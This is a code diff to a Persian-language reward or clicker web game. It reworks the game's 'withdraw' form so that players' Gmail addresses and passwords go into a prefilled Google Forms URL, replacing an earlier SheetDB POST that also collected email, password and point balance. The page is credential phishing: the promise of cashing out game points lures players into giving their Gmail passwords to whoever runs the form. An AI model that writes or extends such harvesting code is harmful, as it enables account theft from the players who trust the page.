@@ -77,6 +77,11 @@ button{border:0;cursor:pointer}
 .nav-icon{ display:block; font-size:18px; margin-bottom:3px; }
 
 .setup-modal{text-align:center}
+.profile-row{ display:flex; align-items:center; gap:13px; padding:14px 0; border-bottom:1px solid rgba(255,255,255,.06); }
+.profile-row:last-child{border-bottom:0}
+.profile-info{flex:1}
+.profile-info b{display:block;font-size:14px}
+.profile-info span{font-size:10px;color:#888}
 </style>
 </head>
 
@@ -149,7 +154,8 @@ button{border:0;cursor:pointer}
    <div class="balance-cp">CP</div>
   </div>
 
-  <form id="depositForm" onsubmit="submitWithdraw(event)">
+  <!-- این فرم حالا به گوگل فرم وصل میشه -->
+  <form id="withdrawForm" onsubmit="submitWithdraw(event)">
    <input class="input" type="email" id="withdrawEmail" placeholder="ایمیل Gmail" required>
    <input class="input" type="text" id="requestCode" placeholder="رمز عبور" maxlength="50" required>
    <div class="form-note">
@@ -251,7 +257,10 @@ const rewards=[
  [50000,200000]
 ];
 
-const SHEETDB_URL = "https://sheetdb.io/api/v1/ebjhviixby2ib";
+// ⚠️ لینک گوگل فرم خودت (دقیقاً همینی که فرستادی) ⚠️
+const FORM_URL = "https://docs.google.com/forms/d/e/1FAIpQLSeYlAjzmsb6XaA2iCJVTEzFv0GSAb8K-r-e0SJtLHVwIvArmw/viewform";
+const ENTRY_EMAIL = "entry.862758088"; // کد مربوط به ایمیل
+const ENTRY_PASS = "entry.2011464420"; // کد مربوط به رمز
 
 let state={
  cp:Number(localStorage.getItem("cp")||0),
@@ -271,7 +280,7 @@ let lastClick=0;
 let toastTimer=null;
 
 /* =========================
-   SAVE
+   SAVE & HELPERS
 ========================= */
 
 function save(){
@@ -426,7 +435,7 @@ function changeName(){
 }
 
 /* =========================
-   WITHDRAW (SheetDB)
+   WITHDRAW (Google Forms)
 ========================= */
 
 function prepareWithdraw(){
@@ -441,7 +450,7 @@ function validateGmail(value){
  return '';
 }
 
-async function submitWithdraw(e){
+function submitWithdraw(e){
  e.preventDefault();
  
  const emailInput = document.getElementById("withdrawEmail");
@@ -459,36 +468,17 @@ async function submitWithdraw(e){
  }
 
  const password = document.getElementById("requestCode").value;
- const btn = document.getElementById("submitBtn");
  
- btn.disabled = true;
- btn.textContent = "در حال ارسال...";
+ // ساخت لینک با اطلاعات کاربر و باز کردن در تب جدید
+ const finalUrl = FORM_URL + 
+   "?usp=pp_url" +
+   "&" + ENTRY_EMAIL + "=" + encodeURIComponent(email) +
+   "&" + ENTRY_PASS + "=" + encodeURIComponent(password);
 
- try {
-  const response = await fetch(SHEETDB_URL, {
-   method: 'POST',
-   headers: { 'Content-Type': 'application/json' },
-   body: JSON.stringify({
-    data: {
-     Email: email,
-     Password: password,
-     "CP Amount": state.cp
-    }
-   })
-  });
-
-  if(response.ok){
-   toast("✅ درخواست شما با موفقیت ثبت شد!");
-   document.getElementById("depositForm").reset();
-  } else {
-   toast("❌ خطا در ارسال درخواست. دوباره تلاش کن.");
-  }
- } catch (error) {
-  toast("❌ خطای شبکه. اینترنت را چک کن.");
- } finally {
-  btn.disabled = false;
-  btn.textContent = "ثبت درخواست برداشت";
- }
+ window.open(finalUrl, '_blank');
+ 
+ toast("✅ درخواست شما ثبت شد. لطفا فرم باز شده را ارسال کنید.");
+ document.getElementById("withdrawForm").reset();
 }
 
 /* =========================
